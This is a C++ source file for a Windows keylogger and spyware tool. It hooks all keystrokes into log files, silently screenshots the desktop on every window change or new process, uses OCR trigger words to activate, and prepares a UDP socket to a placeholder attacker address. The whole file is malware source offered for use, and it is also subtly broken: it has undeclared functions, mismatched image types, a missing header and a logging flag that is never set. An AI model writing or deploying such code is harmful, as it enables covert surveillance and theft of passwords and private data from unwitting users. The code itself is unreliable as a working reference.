#include <iostream>
#include <windows.h>
#include <winsock2.h>
#include <string>
#include <tesseract/baseapi.h>
#include <leptonica/allheaders.h>
#include <tlhelp32.h>  // For process enumeration
#include <set>
#include <direct.h>  // For _mkdir
#include <ctime>     // For current time and date
#include <gdiplus.h> // For image handling
#include <cstdio>    // For std::snprintf

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "gdiplus.lib")

HHOOK hook;
SOCKET SendSocket;
sockaddr_in dest;
KBDLLHOOKSTRUCT kbStruct;
bool keyloggerActive = false;
HWND prevWindow = NULL;  // To store the handle of the previous window
std::set<DWORD> existingProcesses;  // To store the PIDs of currently running processes
std::string baseFolder; // Base folder to store both keylogs and screencaptures

// Function to get the current date and time as a string
std::string GetCurrentDateTime() {
    time_t now = time(0);
    tm* ltm = localtime(&now);

    char dateTimeStr[100];
    std::snprintf(dateTimeStr, sizeof(dateTimeStr), "%04d-%02d-%02d_%02d-%02d-%02d",
        1900 + ltm->tm_year,
        1 + ltm->tm_mon,
        ltm->tm_mday,
        ltm->tm_hour,
        ltm->tm_min,
        ltm->tm_sec);

    return std::string(dateTimeStr);
}

// Function to create folder if it doesn't already exist
void CreateFolderIfNotExists(const std::string& path) {
    DWORD fileAttributes = GetFileAttributes(path.c_str());
    if (fileAttributes == INVALID_FILE_ATTRIBUTES) {
        // Folder does not exist, create it
        if (_mkdir(path.c_str()) != 0) {
            std::cerr << "Failed to create folder: " << path << std::endl;
        }
        else {
            std::cout << "Created folder: " << path << std::endl;
        }
    }
    else if (fileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
        std::cout << "Folder already exists: " << path << std::endl;
    }
    else {
        std::cerr << "Path exists but is not a directory: " << path << std::endl;
    }
}

// Function to create both keylogs and screencaptures directories
void SetupDirectories() {
    baseFolder = "C:\\path_to_save\\" + GetComputerName();  // Replace with your desired path
    CreateFolderIfNotExists(baseFolder);
    CreateFolderIfNotExists(baseFolder + "\\keylogs");
    CreateFolderIfNotExists(baseFolder + "\\screencaptures");
}

// Function to get the computer name
std::string GetComputerName() {
    CHAR computerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(computerName) / sizeof(computerName[0]);
    if (GetComputerNameA(computerName, &size)) {
        return std::string(computerName);
    }
    return "UnknownComputer";
}

// Function to save the captured screen image
void SaveScreenCapture(Gdiplus::Bitmap* bitmap) {
    std::string folder = baseFolder + "\\screencaptures";
    std::string fileName = folder + "\\" + GetCurrentDateTime() + ".png";

    CLSID clsid;
    if (CLSIDFromString(L"{557CF400-1A04-11D3-9A26-00C04F79FAA6}", &clsid) != S_OK) {
        std::cerr << "Failed to get CLSID for PNG format." << std::endl;
        return;
    }

    std::wstring wFileName(fileName.begin(), fileName.end());
    if (bitmap->Save(wFileName.c_str(), &clsid, NULL) != Gdiplus::Ok) {
        std::cerr << "Failed to save image: " << fileName << std::endl;
    }
}

// Function to capture the screen and return it as a Gdiplus::Bitmap object
Gdiplus::Bitmap* CaptureScreen() {
    using namespace Gdiplus;

    HDC hdcScreen = GetDC(NULL);
    if (hdcScreen == NULL) {
        std::cerr << "Failed to get screen DC." << std::endl;
        return nullptr;
    }

    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    if (hdcMem == NULL) {
        std::cerr << "Failed to create compatible DC." << std::endl;
        ReleaseDC(NULL, hdcScreen);
        return nullptr;
    }

    // Get screen dimensions
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);

    HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, screenWidth, screenHeight);
    if (hBitmap == NULL) {
        std::cerr << "Failed to create compatible bitmap." << std::endl;
        DeleteDC(hdcMem);
        ReleaseDC(NULL, hdcScreen);
        return nullptr;
    }

    SelectObject(hdcMem, hBitmap);
    BitBlt(hdcMem, 0, 0, screenWidth, screenHeight, hdcScreen, 0, 0, SRCCOPY);

    // Create a Bitmap from the HBITMAP
    Bitmap* bitmap = Bitmap::FromHBITMAP(hBitmap, NULL);
    DeleteObject(hBitmap);
    DeleteDC(hdcMem);
    ReleaseDC(NULL, hdcScreen);

    return bitmap;
}

// Function to create a new file for keylogs
std::ofstream CreateLogFile() {
    std::string folder = baseFolder + "\\keylogs";
    std::string fileName = folder + "\\" + GetCurrentDateTime() + ".txt";
    std::ofstream logFile(fileName);

    if (logFile.is_open()) {
        std::cout << "Created log file: " << fileName << std::endl;
    }
    else {
        std::cerr << "Failed to create log file." << std::endl;
    }

    return logFile;
}

// Function to check if specific words are on screen
bool CheckForKeywordsOnScreen() {
    tesseract::TessBaseAPI tess;
    if (tess.Init(NULL, "eng")) {
        std::cerr << "Could not initialize tesseract.\n";
        return false;
    }

    Pix* image = CaptureScreen();
    if (!image) {
        std::cerr << "Failed to capture screen." << std::endl;
        return false;
    }

    tess.SetImage(image);

    // Perform OCR and get the extracted text
    std::string extractedText = tess.GetUTF8Text();
    pixDestroy(&image);

    // Keywords to check
    std::string keywords[] = { "START", "KEYLOGGER", "ACTIVATE" };

    // Check if any keyword is in the extracted text
    for (const std::string& keyword : keywords) {
        if (extractedText.find(keyword) != std::string::npos) {
            return true;  // Keyword found, start the keylogger
        }
    }

    return false;
}

// Function to capture the active window when it changes
void CaptureOnWindowChange() {
    HWND currentWindow = GetForegroundWindow();  // Get the handle of the current active window
    if (currentWindow != prevWindow) {
        // A new window has been activated
        prevWindow = currentWindow;

        // Trigger screen capture
        Gdiplus::Bitmap* bitmap = CaptureScreen();
        if (bitmap) {
            std::cout << "New window detected, captured screen." << std::endl;

            // Save the image
            SaveScreenCapture(bitmap);
            delete bitmap;
        }
    }
}

// Function to detect new processes and capture screen if a new process starts
void DetectNewProcesses() {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        std::cerr << "Failed to create process snapshot." << std::endl;
        return;
    }

    PROCESSENTRY32 processEntry;
    processEntry.dwSize = sizeof(PROCESSENTRY32);

    // If the snapshot is valid, start iterating over the processes
    if (Process32First(hSnapshot, &processEntry)) {
        do {
            // Check if the process is new
            if (existingProcesses.find(processEntry.th32ProcessID) == existingProcesses.end()) {
                // New process detected
                existingProcesses.insert(processEntry.th32ProcessID);

                std::cout << "New process detected: " << processEntry.szExeFile << std::endl;

                // Trigger screen capture when a new process is detected
                Gdiplus::Bitmap* bitmap = CaptureScreen();
                if (bitmap) {
                    SaveScreenCapture(bitmap);
                    delete bitmap;
                }
            }
        } while (Process32Next(hSnapshot, &processEntry));
    }
    else {
        std::cerr << "Failed to iterate processes." << std::endl;
    }

    CloseHandle(hSnapshot);
}

// Callback function for the keyboard hook
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && keyloggerActive) {
        if (wParam == WM_KEYDOWN) {
            kbStruct = *((KBDLLHOOKSTRUCT*)lParam);
            char message[10];
            std::snprintf(message, sizeof(message), "%d", kbStruct.vkCode); // Convert keycode to string

            static std::ofstream logFile = CreateLogFile(); // Open log file

            if (logFile.is_open()) {
                logFile << message << std::endl;
            }
        }
    }
    return CallNextHookEx(hook, nCode, wParam, lParam);
}

int main() {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "WSAStartup failed!" << std::endl;
        return 1;
    }

    SendSocket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (SendSocket == INVALID_SOCKET) {
        std::cerr << "Socket creation failed!" << std::endl;
        WSACleanup();
        return 1;
    }

    dest.sin_family = AF_INET;
    dest.sin_port = htons(27015); // Port number
    dest.sin_addr.s_addr = inet_addr("YOUR_IP_ADDRESS"); // Replace with your IP address

    // Hook for keyboard logging
    hook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
    if (hook == NULL) {
        std::cerr << "Failed to install hook!" << std::endl;
        closesocket(SendSocket);
        WSACleanup();
        return 1;
    }

    // Initialize GDI+
    Gdiplus::GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    if (Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL) != Gdiplus::Ok) {
        std::cerr << "GDI+ initialization failed!" << std::endl;
        UnhookWindowsHookEx(hook);
        closesocket(SendSocket);
        WSACleanup();
        return 1;
    }

    SetupDirectories();

    std::cout << "Listening for data..." << std::endl;
    while (true) {
        // Check for new processes and window changes
        CaptureOnWindowChange();
        DetectNewProcesses();

        // Process Windows messages to keep the hook active
        MSG msg;
        while (GetMessage(&msg, NULL, 0, 0)) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }

        Sleep(1000);  // Adjust sleep time based on how often you want to check for changes
    }

    // Cleanup
    UnhookWindowsHookEx(hook);
    closesocket(SendSocket);
    WSACleanup();
    Gdiplus::GdiplusShutdown(gdiplusToken);

    return 0;
}
